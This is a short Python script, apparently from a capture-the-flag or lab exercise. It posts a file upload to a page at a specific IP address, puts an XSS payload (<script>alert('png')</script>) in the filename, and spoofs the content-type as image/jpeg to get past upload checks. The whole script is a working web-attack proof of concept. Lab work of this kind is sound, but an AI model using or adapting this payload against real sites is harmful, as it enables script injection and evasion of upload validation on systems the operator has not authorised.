#!/usr/bin/env python3

import requests

url = 'http://129.241.200.165:18450/?page=upload'

f = { 
        'uploaded':                                 # .. from <form> element in html
            ("<script>alert('png')</script>",       # file name
                'file_contents',                    # actual file contents, normaly `open(fn, 'rb')`
                'image/jpeg')                       # content-type
        }

d = {
        'Upload': 'Upload'                          # from <form> element in html
        }

r = requests.post(url, files=f, data=d)
print(r.text)